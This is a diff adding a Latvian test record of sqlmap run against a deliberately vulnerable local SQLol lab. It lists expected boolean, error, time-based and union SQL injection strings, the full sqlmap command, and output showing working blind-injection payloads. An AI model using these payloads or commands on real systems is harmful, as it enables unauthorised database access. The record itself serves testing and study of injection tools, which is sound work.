@@ -1,0 +1,30 @@
+=================================================================================
+1. Īpašība: tiek atgriezta tikai true/false vērtība, kas norāda, vai vaicājums izdevies
+2. Nepiciešams tampering: nē
+3. Sagaidāmais rezultāts: 
+3.1. boolean-based: ?inject_string=test' or '1'='1
+3.2. error-based: ?inject_string=test'
+3.3. time-based: ?inject_string=test' or sleep(1)%23
+3.4. union: ?inject_string=test' union select 1%23
+4. Reālais rezultāts: redzams zemāk
+5. Vidējais risinājuma ilgums: 19785564 nanosekundes
+6. Palaistā komanda
+sqlmap -u "http://localhost/MCIR/sqlol/select.php?sanitization_level=none&sanitization_type=keyword&sanitization_params=&query_results=bool&error_level=none&show_query=on&inject_string=test&location=where_string&submit=Inject%21" -p inject_string --risk=3 --level=5
+
+7. Jautājumi, kurus uzdeva SQLMap:
+7.1. it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+7.2. GET parameters 'inject_string' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+=================================================================================
+sqlmap identified the following injection point(s) with a total of 610 HTTP(s) requests:
+---
+Parameter: inject_string (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: sanitization_level=none&sanitization_type=keyword&sanitization_params=&query_results=bool&error_level=none&show_query=on&inject_string=-6525' OR 7618=7618-- bRnQ&location=where_string&submit=Inject!
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: sanitization_level=none&sanitization_type=keyword&sanitization_params=&query_results=bool&error_level=none&show_query=on&inject_string=test' AND (SELECT 5699 FROM (SELECT(SLEEP(5)))ZKhJ)-- dVPe&location=where_string&submit=Inject!
+---
+web application technology: PHP 5.6.40, Apache 2.4.38
+back-end DBMS: MySQL >= 5.0.12
